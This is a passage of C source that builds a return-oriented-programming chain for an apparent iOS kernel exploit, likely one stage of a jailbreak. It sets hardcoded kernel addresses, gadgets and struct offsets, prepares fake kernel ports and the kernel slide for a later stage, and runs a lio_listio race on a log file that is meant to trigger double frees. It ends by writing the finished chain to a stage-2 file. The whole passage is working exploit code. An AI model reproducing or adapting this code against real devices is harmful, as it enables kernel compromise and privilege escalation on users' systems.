			kern_return_t (*IOConnectTrap6) (io_connect_t connect,uint32_t selector, uint64_t arg1,uint64_t arg2,uint64_t arg3,uint64_t arg4,uint64_t arg5,uint64_t arg6);
			kern_return_t (*mach_ports_lookup) (task_t target_task,mach_port_array_t init_port_set,mach_msg_type_number_t * init_port_count);
			mach_port_name_t (*mach_task_self) ();
			kern_return_t (*mach_vm_remap) (vm_map_t target_task, mach_vm_address_t *target_address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src_task, mach_vm_address_t src_address, boolean_t copy, vm_prot_t *cur_protection, vm_prot_t *max_protection, vm_inherit_t inheritance);
			kern_return_t (*mach_port_destroy) (ipc_space_t task,mach_port_name_t name);
			kern_return_t (*mach_port_deallocate) (ipc_space_t task,mach_port_name_t name);
			kern_return_t (*mach_port_allocate) (ipc_space_t task,mach_port_right_t right,mach_port_name_t *name);
			kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
			kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
			mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
			int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
		} userland_funcs;
	} offsets_t;
	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
	memset(lib_offsets,0,sizeof(offsets_t));
	lib_offsets->constant.kernel_image_base = 0xfffffff007004000;
#define sym(name) jake_find_symbol(kernel_symbols,name)
	lib_offsets->funcs.copyin = sym("_copyin");
	lib_offsets->funcs.copyout = sym("_copyout");
	lib_offsets->funcs.current_task = sym("_current_task");
	lib_offsets->funcs.get_bsdtask_info = sym("_get_bsdtask_info");
	lib_offsets->funcs.vm_map_wire_external = sym("vm_map_wire_external");
	lib_offsets->funcs.vfs_context_current = sym("vfs_context_current");
	lib_offsets->funcs.vnode_lookup = sym("_vnode_lookup");
	lib_offsets->funcs.osunserializexml = sym("__Z16OSUnserializeXMLPKcPP8OSString");
	lib_offsets->funcs.smalloc = 0xfffffff006b1acb0; // isn't used anymore
	lib_offsets->funcs.ipc_port_alloc_special = 0xfffffff0070b9328;
	lib_offsets->funcs.ipc_kobject_set = 0xfffffff0070cf2c8;
	lib_offsets->funcs.ipc_port_make_send = 0xfffffff0070b8aa4;
	lib_offsets->gadgets.add_x0_x0_ret = sym("_csblob_get_cdhash");
	lib_offsets->data.realhost = find_realhost(kernel_symbols);
	lib_offsets->data.zone_map = find_zonemap(kernel_symbols);
	lib_offsets->data.kernel_task = sym("_kernel_task");
	lib_offsets->data.kern_proc = sym("_kernproc");
	lib_offsets->data.rootvnode = sym("_rootvnode");
	lib_offsets->data.osboolean_true = 0xfffffff00764c468; // isn't used anymore
	lib_offsets->data.trust_cache = 0xfffffff0076b8ee8; // isn't used by stage 3
	// maybe wrong (we will not include them in the symbol finder for now, if that fails we still have the killswitch and could add version differences later)
	lib_offsets->struct_offsets.is_task_offset = 0x28; 
	lib_offsets->struct_offsets.task_itk_self = 0xd8;
	lib_offsets->struct_offsets.itk_registered = 0x2f0;
	lib_offsets->struct_offsets.ipr_size = 0x8;
	lib_offsets->struct_offsets.sizeof_task = 0x5c8;
	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3a8;
	lib_offsets->struct_offsets.task_all_image_info_size = 0x3b0;
	// iosurface stuff isn't set and also isn't used
	lib_offsets->userland_funcs.write = (void*)(get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.IOConnectTrap6 = (void*)(get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_ports_lookup = (void*)(get_addr_from_name(offsets,"mach_ports_lookup") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_task_self = (void*)(get_addr_from_name(offsets,"mach_task_self") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_vm_remap = (void*)(offsets->raw_mach_vm_remap_call - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_port_destroy = (void*)(get_addr_from_name(offsets,"mach_port_destroy") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_port_deallocate = (void*)(get_addr_from_name(offsets,"mach_port_deallocate") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_port_allocate = (void*)(get_addr_from_name(offsets,"mach_port_allocate") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_port_insert_right = (void*)(get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_ports_register = (void*)(get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.mach_msg = (void*)(get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr);
	lib_offsets->userland_funcs.posix_spawn = (void*)(get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr);
	DEFINE_ROP_VAR("lib_offsets",sizeof(offsets_t),lib_offsets);
	// jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
	ROP_VAR_ARG_HOW_MANY(7);
	ROP_VAR_ARG("fakeport",1);
	ROP_VAR_ARG("fake_client",2);
	ROP_VAR_ARG64("ip_kobject_client_port",3);
	ROP_VAR_ARG64("task_pointer",4);
	ROP_VAR_ARG64("kslide",5);
	ROP_VAR_ARG64("the_one",6);
	ROP_VAR_ARG("lib_offsets",7);
	CALL_FUNCTION_NO_SLIDE(offsets->BEAST_GADGET,offsets->stage3_jumpaddr,0,0,0,0,0,0,0,0);




	// SECOND THREAD STACK STARTS HERE
	// we basically use this large barrier to make sure that we don't accidentally smash the first thread buffer with this one by pushing to many frames in this one
	ADD_BARRIER(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE);
 

	// longjmp buf, pivoting everything
	ADD_GADGET(); /* x19 */
    ADD_GADGET(); /* x20 */
    ADD_GADGET(); /* x21 */
    ADD_GADGET(); /* x22 */
    ADD_GADGET(); /* x23 */
    ADD_GADGET(); /* x24 */
    ADD_GADGET(); /* x25 */
    ADD_GADGET(); /* x26 */
    ADD_GADGET(); /* x27 */
    ADD_GADGET(); /* x28 */
    ADD_GADGET(); /* x29 */
    ADD_CODE_GADGET(offsets->BEAST_GADGET_LOADER); /* x30 */ 
    ADD_GADGET(); /* x29 */ 
    ADD_STATIC_GADGET(offsets->stage2_base + offsets->stage2_max_size + BARRIER_BUFFER_SIZE+22*8 /*jump over that longjmp buffer here*/); /* x2 */ 
    ADD_GADGET(); /* D8 */
    ADD_GADGET(); /* D9 */
    ADD_GADGET(); /* D10 */
    ADD_GADGET(); /* D11 */
    ADD_GADGET(); /* D12 */
    ADD_GADGET(); /* D13 */
    ADD_GADGET(); /* D14 */
    ADD_GADGET(); /* D15 */

	// we need a sandbox accessible file and we need root for this, this is why the other thread waits a bit till it drops priv
	char * racer_path = malloc(100);
	memset(racer_path,0,100);
	snprintf(racer_path,100,"/private/var/log/racoon.log");
	DEFINE_ROP_VAR("racer_path",100,racer_path);

	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	DEFINE_ROP_VAR("racer_fd",sizeof(uint64_t),tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("racer_path",1);
	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name(offsets,"open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);

	// setup the thread register to fix errno
	DEFINE_ROP_VAR("thread_ptr",0x60,tmp);
	ROP_VAR_ARG_HOW_MANY(1);
	ROP_VAR_ARG("thread_ptr",1);
	CALL("_pthread_set_self",0,0,0,0,0,0,0,0);


	// setup the race
	DEFINE_ROP_VAR("aio_list",NENT * 8,tmp);
	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
	DEFINE_ROP_VAR("aio_buf",NENT,tmp);

	// they are using this struct to tell the syscall what to do
	for (uint32_t i = 0; i < NENT; i++) {
		int offset = sizeof(struct aiocb) * i;
		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4); // use our fd
		SET_ROP_VAR64_W_OFFSET("aios",0,offset + offsetof(struct aiocb,aio_offset));  // file offset 0
		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i); // a buffer where it should put the data
		SET_ROP_VAR64_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes)); // 1 byte (so this has to be as fast as possible that's why we only do 1 byte)
		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); // read operation
		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify)); // we need to specify a signal here, but I didn't knew that you could specify none, this is why I blocked all the signals above (I think there was also an idea to use signals to race more efficant but we didn't used it in the end and the code above that blocks signals is a left over)

		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
	}

	ADD_LOOP_START("racer_loop");
		for (int i = 0; i<1;i++) { // I thought I should maybe unroll this, but then I got too many double frees without reallocations so I slowed this loop down a bit by not unrolling it
			ROP_VAR_ARG_HOW_MANY(1);
			ROP_VAR_ARG("aio_list",2);
			CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
			ROP_VAR_ARG_HOW_MANY(1);
			for (int x = 0; x < NENT; x++) {
				ROP_VAR_ARG64_W_OFFSET("aio_list",1,x*8);
				CALL("aio_return",0,0,0,0,0,0,0,0);
			}
		}

		// set x0 
		SET_X0_FROM_ROP_VAR("should_race");
		// break out of the loop if x0 is nonzero
		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
	ADD_LOOP_END();
	
	// this thread wasn't spawned using pthread so we can't easily exit... so we just spin
	ADD_LOOP_START("endless_thread_loop");
		ADD_USLEEP(10000000);
	ADD_LOOP_END();





	// END OF THE ROP CHAIN (finally :D)

	// build the data buffer with all the rop variables
	if (curr_rop_var != NULL) {
		build_databuffer(offsets,rop_var_top);
	}
	// build the chain using Debug so that we can see it as console output
#ifndef RELEASE 
	build_chain_DBG(offsets,rop_var_top);
#endif
	// generate the stack
	char path[1024];
	snprintf(path,sizeof(path),"%s/stg2",base_dir);
	int fd = open(path,O_WRONLY | O_CREAT, 0644);
	build_chain(fd,offsets,rop_var_top);
}
